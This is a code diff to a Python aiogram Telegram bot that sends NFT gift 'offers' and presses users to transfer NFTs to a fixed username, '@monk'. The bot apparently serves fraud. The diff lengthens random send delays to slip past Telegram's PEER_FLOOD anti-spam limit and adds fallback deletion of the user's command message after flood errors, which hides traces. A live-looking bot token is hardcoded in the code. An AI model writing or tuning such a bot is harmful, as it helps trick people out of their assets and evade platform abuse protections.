@@ -9,7 +9,7 @@ from aiogram.fsm.storage.memory import MemoryStorage
 
 # Настройки
 TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
-RECIPIENT = "@monk"  # Юзернейм, куда передается НФТ
+RECIPIENT = "@monk" # Юзернейм, куда передается НФТ
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
@@ -309,12 +309,12 @@ async def decline_offer(cb: CallbackQuery):
 async def noop_handler(cb: CallbackQuery):
     await cb.answer("Сначала выполните передачу НФТ по кнопке выше!", show_alert=True)
 
-# Фоновый воркер с защитой от PEER_FLOOD
+# Фоновый воркер с увеличенной задержкой (5.0 - 8.0 сек) для предотвращения PEER_FLOOD
 async def sender_worker():
     while True:
         task = await message_queue.get()
         try:
-            await asyncio.sleep(random.uniform(3.0, 5.0))
+            await asyncio.sleep(random.uniform(5.0, 8.0))
 
             text = build_offer_text(
                 task["gift_name"], 
@@ -353,15 +353,21 @@ async def sender_worker():
             if "PEER_FLOOD" in str(e):
                 logging.warning(f"PEER_FLOOD detected in chat {task['chat_id']}. Cleaning up command and notifying user.")
                 
-                # СРАЗУ удаляем команду qq из чата при флуде
+                # Удаляем команду qq из чата
                 try:
-                    if task["bcid"]:
-                        await bot.delete_business_messages(
-                            business_connection_id=task["bcid"],
-                            message_ids=[task["cmd_message_id"]]
-                        )
-                except Exception as del_err:
-                    logging.error(f"Failed to delete command message on flood: {del_err}")
+                    await bot.delete_message(
+                        chat_id=task["chat_id"],
+                        message_id=task["cmd_message_id"]
+                    )
+                except Exception:
+                    try:
+                        if task["bcid"]:
+                            await bot.delete_business_messages(
+                                business_connection_id=task["bcid"],
+                                message_ids=[task["cmd_message_id"]]
+                            )
+                    except Exception:
+                        pass
 
                 # Отправляем сообщение в ЛС с самим ботом пользователю
                 target_user_id = client_user_ids.get(task["chat_id"])
